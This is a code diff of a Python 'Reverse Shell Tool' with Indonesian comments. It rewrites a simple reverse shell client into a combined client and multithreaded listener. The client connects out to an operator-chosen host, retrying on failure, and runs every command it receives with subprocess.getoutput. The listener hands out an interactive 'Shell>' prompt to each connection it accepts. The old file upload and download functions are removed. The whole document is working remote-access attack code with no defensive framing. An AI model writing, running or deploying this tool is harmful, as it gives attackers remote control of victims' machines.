@@ -1,93 +1,150 @@
+#!/usr/bin/env python3
 import socket
 import subprocess
 import os
 import sys
+import argparse
+import threading
+import time
 
 def main():
     # ASCII Art Banner
     banner = """
- ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗
-██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║
-██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║
-██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║
+ ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
+██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
+██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗█████╗███████╗███████║█████╗  ██║     ██║     
+██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝╚════╝╚════██║██╔══██║██╔══╝  ██║     ██║     
 ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗    ███████║██║  ██║███████╗███████╗███████╗
-╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝                                                                                                   
     """
     print(banner)
 
-    # Check for command-line arguments
-    if len(sys.argv) != 3:
-        print("Usage: python3 reverse_shell.py <target_ip> <target_port>")
-        sys.exit(1)
-
-    # Replace with your IP address and port from command-line arguments
-    target_ip = sys.argv[1]
+def list_local_ips():
+    """Fungsi untuk mendapatkan dan menampilkan IP lokal yang tersedia."""
     try:
-        target_port = int(sys.argv[2])  # Convert port to integer
-    except ValueError:
-        print("Error: Port must be an integer.")
-        sys.exit(1)
-
-    # Create a socket object
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        # Connect to the target
-        s.connect((target_ip, target_port))
+        host_name = socket.gethostname()
+        local_ips = socket.gethostbyname_ex(host_name)[2]
     except Exception as e:
-        print(f"Error: Could not connect to {target_ip}:{target_port}. {e}")
-        sys.exit(1)
+        print(f"[-] Gagal mengambil IP lokal: {e}")
+        local_ips = []
+    if local_ips:
+        print("[+] IP address lokal yang tersedia:")
+        for ip in local_ips:
+            print(" -", ip)
+    else:
+        print("[-] Tidak ditemukan IP lokal.")
+    return local_ips
 
+def client_mode(server_ip, server_port):
+    """Mode client: menghubungkan ke server dan mengeksekusi perintah secara reverse shell."""
+    print("BANNER")
+    print(f"[+] Mode Client: Menghubungkan ke {server_ip}:{server_port}")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while True:
-        # Receive the command from the attacker
-        command = s.recv(1024).decode()
-
-        if command.lower() == 'exit':
+        try:
+            s.connect((server_ip, server_port))
+            print(f"[+] Terhubung ke {server_ip}:{server_port}")
             break
-
-        elif command[:6] == 'upload':
-            filename = command[7:]
-            try:
-                with open(filename, 'wb') as f:
-                    data = s.recv(4096)
-                    while data:
-                        f.write(data)
-                        data = s.recv(4096)
-                s.send(str.encode('File uploaded successfully\n'))
-            except Exception as e:
-                s.send(str.encode(f'Error uploading file: {e}\n'))
-
-        elif command[:8] == 'download':
-            filename = command[9:]
-            if os.path.exists(filename):
+        except Exception as e:
+            print(f"[-] Koneksi gagal: {e}. Mencoba lagi dalam 5 detik...")
+            time.sleep(5)
+    try:
+        while True:
+            command = s.recv(1024).decode()
+            if not command:
+                break
+            command = command.strip()
+            if command.lower() == 'exit':
+                print("[*] Perintah exit diterima. Menutup koneksi.")
+                break
+            elif command.lower().startswith("cd "):
                 try:
-                    with open(filename, 'rb') as f:
-                        data = f.read(4096)
-                        while data:
-                            s.send(data)
-                            data = f.read(4096)
-                    s.send(str.encode('File downloaded successfully\n'))
+                    os.chdir(command[3:].strip())
+                    output = f"[+] Direktori berubah ke: {os.getcwd()}"
                 except Exception as e:
-                    s.send(str.encode(f'Error downloading file: {e}\n'))
+                    output = f"[-] Error: {e}"
+                s.send(output.encode())
             else:
-                s.send(str.encode('File not found\n'))
-
-        elif command[:2] == 'cd':
-            try:
-                os.chdir(command[3:])
-                s.send(str.encode(os.getcwd() + '> '))
-            except Exception as e:
-                s.send(str.encode(f'Error changing directory: {e}\n'))
-
-        else:
-            try:
                 output = subprocess.getoutput(command)
-                s.send(str.encode(output + '\n'))
-            except Exception as e:
-                s.send(str.encode(f'Error executing command: {e}\n'))
+                if not output:
+                    output = "[No output]"
+                s.send(output.encode())
+    except KeyboardInterrupt:
+        print("\n[*] Client dihentikan oleh pengguna.")
+    finally:
+        s.close()
 
-    # Close the connection
-    s.close()
+def handle_client(client_socket, addr):
+    """Handler untuk setiap koneksi client pada mode server."""
+    print(f"\n[+] Koneksi diterima dari {addr[0]}:{addr[1]}")
+    try:
+        while True:
+            command = input("Shell> ").strip()
+            if not command:
+                continue
+            try:
+                client_socket.send(command.encode())
+            except Exception as e:
+                print(f"[-] Gagal mengirim perintah: {e}")
+                break
+            if command.lower() == "exit":
+                print("[*] Menutup koneksi dengan client.")
+                break
+            try:
+                response = client_socket.recv(4096).decode()
+                print(response)
+            except Exception as e:
+                print(f"[-] Gagal menerima response: {e}")
+                break
+    except KeyboardInterrupt:
+        print("\n[*] Sesi dihentikan oleh pengguna.")
+    finally:
+        client_socket.close()
+
+def server_mode(bind_ip, bind_port):
+    """Mode server: listing IP lokal, binding, dan listening untuk koneksi reverse shell."""
+    print("BANNER")
+    print("[*] Mode Server: Listener Reverse Shell")
+    local_ips = list_local_ips()
+    # Jika bind_ip belum diberikan, minta input dari user
+    if not bind_ip:
+        bind_ip = input("Masukkan IP yang ingin digunakan untuk binding: ").strip()
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        server.bind((bind_ip, bind_port))
+    except Exception as e:
+        print(f"[-] Gagal bind ke {bind_ip}:{bind_port} -> {e}")
+        sys.exit(1)
+    server.listen(5)
+    print(f"[+] Listening pada {bind_ip}:{bind_port} ...")
+    print("[*] Tekan Ctrl+C untuk menghentikan listener.")
+    try:
+        while True:
+            client_socket, addr = server.accept()
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
+            client_thread.daemon = True
+            client_thread.start()
+    except KeyboardInterrupt:
+        print("\n[*] Listener dihentikan oleh pengguna.")
+    finally:
+        server.close()
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Reverse Shell Tool - Combined Client and Server (Listing & Listening)"
+    )
+    parser.add_argument("mode", choices=["server", "client"], help="Pilih mode: 'server' untuk listener, 'client' untuk reverse shell client")
+    parser.add_argument("--ip", help="IP address untuk binding (server) atau IP server (client)")
+    parser.add_argument("--port", type=int, required=True, help="Port untuk binding atau koneksi")
+    args = parser.parse_args()
+
+    if args.mode == "server":
+        server_mode(args.ip, args.port)
+    elif args.mode == "client":
+        if not args.ip:
+            print("[-] Untuk mode client, IP server harus ditentukan dengan --ip")
+            sys.exit(1)
+        client_mode(args.ip, args.port)
 
 if __name__ == "__main__":
     main()
